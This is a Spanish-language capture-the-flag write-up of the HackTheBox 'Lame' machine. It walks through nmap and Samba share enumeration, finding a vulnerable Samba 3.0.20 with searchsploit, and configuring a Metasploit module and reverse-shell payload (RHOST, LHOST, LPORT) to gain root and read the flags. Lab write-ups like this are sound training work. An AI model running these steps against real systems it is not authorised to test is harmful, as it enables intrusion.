---
title: "HackTheBox Lame Writeup"
layout: post
--- 



<img src="/assets/HTB/Lame/Lame.png" width="400" />

Como dice en el titulo hoy haremos una maquina Linux de dificultad facil,la  maquina Lame de HackTheBox.


### Enumeracion 


Lo primero que haremos sera un escaneo de puertos con la herramienta **Nmap** en la ip de la maquina.Esto nos mostrara los puertos abiertos 

```
 nmap -p- --open --min-rate 5000 -Pn -n -v IP -oG puertos

```
Explicacion del comando:

* -p- Escanea todos los puertos
* --open Busca puertos abiertos
* --min-rate 5000 Envia como minimo 5000 paquetes por segundo,tambien se puede utilizar -T5
* -Pn Trata a los hosts como online,asi saltea host discovery
* -n No hacer resolucion de DNS
* -v Nos va mostrando los resultados mientras escanea
* IP La ip de Lame
* -oG Para guardar el escaneo en formato grep.

El Resultado:

<img src="/assets/HTB/Lame/puertos.png" width="700" />

Ahora copiamos a la clipboard los puertos para analizarlos en profundidad.Para copiar los puertos y no introducirlos de a uno cree una funcion que hace eso por mi.

Una vez copiados los puertos a la clipboard vamos a extraerles mas informacion con nmap

```
 nmap -sV -sC -p21,22,139,445,3632 -Pn IP -oN infopuertos

```
Explicacion del comando:

* -sV:busca la version del servicio funcionando en el puerto
* -sC:Nmap lanza un conjunto de scripts basicos de enumeracion
* -p:Especificamos los puertos
* IP:La ip de Lame
* -oN:Para guardar el analisis en formato nmap,pueden utilizar el que quieran

Una vez finalizado el escaneo podremos ver mucha informacion.


<img src="/assets/HTB/Lame/infosamba.png" width="700" />



En la foto superior podemos ver que se puede acceder a los shares de samba sin autenticacion, asi que primero vamos a empezar por ahi

#### Enumeracion Samba

Primero veamos los shares,para esto vamos a utilizar **smbclient** .Herramienta de samba que se utiliza para establecer una conexion con el SMB Server de la maquina Lame.


```
 smbclient -L IP

```
Explicacion del comando

* -L:Le pedimos que liste los Shares(carpetas compartidas). 
 

<img src="/assets/HTB/Lame/sambashares.png" width="700" />


Ahora con la herramienta **smbmap** vamos a ver el contenido de estos shares,me llama la atencion tmp y opt

```
smbmap -R tmp -H IP

```
Explicacion del comando:

* -R Le decimos a smbmap cual es el share que queremos abrir,en este caso tmp
* -H Le especificamos la direccion ip de la maquina
 
<img src="/assets/HTB/Lame/sharetmp.png" width="700" />


El resultado no muestra nada interesante,lo mismo ocurre con la carpeta opt y las demas. Podemos concluir que no hay nada de nuestro interes en los shares.

Lo unico que nos queda hacer con samba es ver si su version es vulnerable:

<img src="/assets/HTB/Lame/sambaversion.png" width="700" />

 
>La version esta marcada con rojo

Con esta informacion vamos a utilizar **searchsploit** para buscar si esa version de samba es vulnerable

<img src="/assets/HTB/Lame/searchsploit.png" height="1000" />

Podemos ver que esta version es vulnerable pero hay que utilizar **Metasploit**

### Explotacion

Ahora que ya completamos la fase de **Enumeracion**(recopilacion de informacion) vamos a explotar la vulnerabilidad para acceder a la maquina Lame,para ello vamos a ejecutar metasploit con el comando

>msfconsole

Una vez abierto buscamos samba 3.0.20. El servicio y la version,recuerda que es vulnerable con metasploit.

>search samba 3.0.20


<img src="/assets/HTB/Lame/metasploitsearch.png" width="7000" />


Ahora vamos a utilizar este modulo.colocando el comando **use** y la direccion del modulo.Una vez seleccionado vamos a ver las opciones que tiene con el comando **options**

<img src="/assets/HTB/Lame/metasploituse.png" width="700" />

Ahora vamos a configurar el exploit.

En **RHOST** colocamos la IP de la maquina a explotar,la maquina Lame Y en **RPORT** el puerto.Recuerda que el puerto es el  445 de samba

<img src="/assets/HTB/Lame/setrhost.png" width="700" />

>set RHOST IP

<img src="/assets/HTB/Lame/setrport.png" width="700" />

>set RPORT 445

Ahora vamos a configurar el payload que nos dara la shell

>Se recomienda cambiar de payload por un meterpreter yo lo voy a dejar por defecto pero si quieres cambiarlo adelante :)

En **LHOST** colocamos nuestra ip,la que nos da HackTheBox y en **LPORT** un puerto en el que metasploit se conectara y nos dara la shell.

<img src="/assets/HTB/Lame/setlhost.png" width="700" />

>set LHOST IP

<img src="/assets/HTB/Lame/setlport.png" width="200" />

>set LPORT 1480
 
Quedaria asi:

<img src="/assets/HTB/Lame/options2.png" width="700" />

Ya configurado nos queda escribir el comando **exploit** y esperar a que Metasploit nos de la shell 

#### Post-Explotacion

<img src="/assets/HTB/Lame/exploit.png" width="700" />

como podemos ver obtuvimos acceso a la maquina y cuando escribimos el comando **whoami** nos confirma de que somos root,el usuario con mas privilegios en el sistema.

No debemos de escalar privilegios,ya que la vulnerabilidad de samba es muy critica dejandonos acceder como root.Solo queda buscar las flags

La flag user esta ubicada en una carpeta llamada makis dentro de home

<img src="/assets/HTB/Lame/user.png" width="300" />

La flag root esta ubicada en el directorio root

<img src="/assets/HTB/Lame/root.png" width="300" />




---


